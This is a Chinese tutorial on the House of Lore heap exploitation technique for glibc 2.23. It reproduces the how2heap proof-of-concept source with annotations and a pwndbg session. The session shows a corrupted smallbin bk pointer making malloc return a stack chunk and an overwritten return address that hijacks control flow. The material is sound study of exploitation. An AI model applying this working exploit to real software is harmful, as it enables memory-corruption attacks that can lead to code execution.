## House of Lore 

#### 本机制讲解是基于how2heap上面glibc-2.23版本下house-of-lore的

### 机制讲解
* **house of lore实际上是将堆上UAF和栈利用结合起来的一个机制**，
前面先构造两个栈上的fake chunk，再分配一个与某一个smallbin大小一致的chunk，
通过将修改他们对应的fd和bk指针位，构造一条small bin的链。
将真chunk在释放之后再拿回来，这样下一次分配就拿到了栈上面的假chunk地址作为堆块
这时候将假chunk对应偏移的地址（函数栈的返回地址），改成想调用的ROP链，就可以成功getshell了

### 源码详解
下面我们拿how2heap上面的源码作为示例进行讲解
```c
// how2heap/glibc_2.23/house_of_lore.c
/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.

[ ... ]

else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){ // 这是unlink检查，只要通过这个，就可以构造small bin上面的链

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

       [ ... ]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0}; // 栈上面开辟的两个假chunk 

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(0x100); // 分配一个真chunk
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake chunk on the stack\n");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0; 
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;  // 第一个假chunk的fd指针指向真chunk，为了能通过unlink检查

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2; // 第一个假chunk的bk指针指向第二个假chunk
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1; // 第二个假chunk的fd指针指向第一个假chunk
  
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000); // 这个块是为了防止malloc consolidate的
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim); // 将真chunk释放，现在他应该在unsortedbin上面

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200); // 再malloc一个不相干的块，这个会促使真chunk到smallbin里面对应的那个bin里面
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack 真chunk的bk指针指向了第一个假chunk，现在smallbin上面是head->victim->stack_buff1->stack_buff2,中间箭头为bk指针指向

  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(0x100); // 第一个把真chunk拿走，unlink之后现在smallbin上面是head->stack_buf1->stack_buf2


  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(0x100); // 再malloc一个与真chunk同样大小，成功拿到stack_buf1,smallbin里面还剩下第二个假chunk
  fprintf(stderr, "p4 = malloc(0x100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  long offset = (long)__builtin_frame_address(0) - (long)p4; // 计算rbp到当前stack_buf1的偏移
  memcpy((p4+offset+8), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary 把主函数返回地址改成jackpot了，现实中可以改成rop链去getshell

  // sanity check
  assert((long)__builtin_return_address(0) == (long)jackpot);
}

```

### gdb断点调试讲解
1. 先malloc一个块，并在栈上面构造两个假chunk
```bash
pwndbg> b 51
Breakpoint 2 at 0x555555555397: file glibc_2.23/house_of_lore.c, line 52.
pwndbg> c
Continuing.

Welcome to the House of Lore
This is a revisited version that bypass also the hardening check introduced by glibc malloc
This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23

Allocating the victim chunk
Allocated the first small chunk on the heap at 0x555555559010
stack_buffer_1 at 0x7fffffffde60 假chunk1
stack_buffer_2 at 0x7fffffffde40 假chunk2

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x110 (with flag bits: 0x111) 真chunk位置

Top chunk | PREV_INUSE
Addr: 0x555555559110
Size: 0x20ef0 (with flag bits: 0x20ef1)

```
2. 把假chunk1的fd bk指针都改掉，fd指向victim，bk指向假chunk2
```bash
pwndbg> b 63
Breakpoint 3 at 0x555555555420: file glibc_2.23/house_of_lore.c, line 63.
pwndbg> c
Continuing.
Create a fake chunk on the stack
Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stack

pwndbg> x/4gx 0x7fffffffde60
0x7fffffffde60:	0x0000000000000000	0x0000000000000000
0x7fffffffde70:	0x0000555555559000	0x00007fffffffde40 前一个是fd指针，后一个是bk，可以看到都改对了
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x110 (with flag bits: 0x111)

Top chunk | PREV_INUSE
Addr: 0x555555559110
Size: 0x20ef0 (with flag bits: 0x20ef1)
```
3. 把假chunk2的bk指针指向假chunk1
```bash
pwndbg> n
pwndbg> x/4gx 0x00007fffffffde40
0x7fffffffde40:	0x0000000000000000	0x0000000000000000
0x7fffffffde50:	0x00007fffffffde60	0x00007fffffffde8f
```
4. free，把真chunk放入unsortedbin
```bash
pwndbg> b 77
Breakpoint 4 at 0x55555555552c: file glibc_2.23/house_of_lore.c, line 78.
pwndbg> c
Continuing.
Allocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
Allocated the large chunk on the heap at 0x555555559120
Freeing the chunk 0x555555559010, it will be inserted in the unsorted bin

In the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)
victim->fwd: 0x7ffff7bc4b78
victim->bk: 0x7ffff7bc4b78

pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555559000
Size: 0x110 (with flag bits: 0x111)
fd: 0x7ffff7bc4b78 可以看到真chunk已经被放到unsortedbin上面了
bk: 0x7ffff7bc4b78

Allocated chunk
Addr: 0x555555559110
Size: 0x3f0 (with flag bits: 0x3f0)

Top chunk | PREV_INUSE
Addr: 0x555555559500
Size: 0x20b00 (with flag bits: 0x20b01)
```
5. malloc一个不相干大小的块，把真chunk放到smallbin里面
```bash
pwndbg> b 87
Breakpoint 5 at 0x555555555621: file glibc_2.23/house_of_lore.c, line 90.
pwndbg> c
Continuing.
Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
This means that the chunk 0x555555559010 will be inserted in front of the SmallBin
The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x555555559510
The victim chunk has been sorted and its fwd and bk pointers updated
victim->fwd: 0x7ffff7bc4c78
victim->bk: 0x7ffff7bc4c78

pwndbg> heap
Free chunk (smallbins) | PREV_INUSE
Addr: 0x555555559000
Size: 0x110 (with flag bits: 0x111)
fd: 0x7ffff7bc4c78 smallbin的head地址，成功进入smallbin
bk: 0x7ffff7bc4c78

Allocated chunk
Addr: 0x555555559110
Size: 0x3f0 (with flag bits: 0x3f0)

Allocated chunk | PREV_INUSE
Addr: 0x555555559500
Size: 0x4c0 (with flag bits: 0x4c1)

Top chunk | PREV_INUSE
Addr: 0x5555555599c0
Size: 0x20640 (with flag bits: 0x20641)
```
6. 修改victim的bk指针，使得构成一个smallbin上的链
```bash
pwndbg> b 94
Breakpoint 6 at 0x555555555656: file glibc_2.23/house_of_lore.c, line 96.
pwndbg> c
Continuing.
Now emulating a vulnerability that can overwrite the victim->bk pointer

pwndbg> smallbin
smallbins
0x110 [corrupted]
FD: 0x555555559000 —▸ 0x7ffff7bc4c78 (main_arena+344) ◂— 0x555555559000
BK: 0x555555559000 —▸ 0x7fffffffde60 {stack_buffer_1} —▸ 0x7fffffffde40 {stack_buffer_2} —▸ 0x7fffffffde8f ◂— 0x7fffffffdf7800
```
7. 分配一次，拿到真chunk（victim），头部现在bk指向stack_buffer_1
```bash
pwndbg> b 101
Breakpoint 7 at 0x5555555556aa: file glibc_2.23/house_of_lore.c, line 102.
pwndbg> c
Continuing.
Now allocating a chunk with size equal to the first one freed
This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer

pwndbg> smallbin
smallbins
0x110 [corrupted]
FD: 0x555555559000 —▸ 0x7ffff7bc4c78 (main_arena+344) ◂— 0x555555559000
BK: 0x7fffffffde60 {stack_buffer_1} —▸ 0x7fffffffde40 {stack_buffer_2} —▸ 0x7fffffffde8f ◂— 0x7fffffffdf7800 smallbin上面果真如我们所料
pwndbg> p/x p3
$1 = 0x555555559010 成功拿到victim
```
8. 再分配一次，拿到stack_buffer_1
```bash
pwndbg> b 110
Breakpoint 8 at 0x555555555742: file glibc_2.23/house_of_lore.c, line 110.
pwndbg> c
Continuing.
This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
p4 = malloc(0x100)

The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7ffff7bc4c78

p4 is 0x7fffffffde70 and should be on the stack!

pwndbg> smallbins
smallbins
0x110 [corrupted]
FD: 0x555555559000 —▸ 0x7ffff7bc4c78 (main_arena+344) ◂— 0x555555559000
BK: 0x7fffffffde40 {stack_buffer_2} —▸ 0x7fffffffde8f ◂— 0x7fffffffdf7800
pwndbg> p/x p4
$2 = 0x7fffffffde70 成功拿到stack_buffer_1
```
9. 计算偏移，更改返回地址
```bash
pwndbg> i r rbp
rbp            0x7fffffffde90      0x7fffffffde90
pwndbg> x/2gx 0x7fffffffde90
0x7fffffffde90:	0x0000000000000000	0x00007ffff7820840 原始的返回地址是0x7ffff7820840
pwndbg> n
pwndbg> p/x sc
$3 = 0x555555555209
pwndbg> b 113
Breakpoint 9 at 0x55555555577a: file glibc_2.23/house_of_lore.c, line 115.
pwndbg> c
Continuing.
pwndbg> x/2gx 0x7fffffffde90
0x7fffffffde90:	0x0000000000000000	0x0000555555555209 现在返回地址变为jackpot的0x555555555209
```
10. 继续执行程序，发现从main返回之后直接到jackpot了，说明前面的返回地址修改成功
```bash
pwndbg> n
Nice jump d00d
```

### glibc2.27下的house of lore
未完待续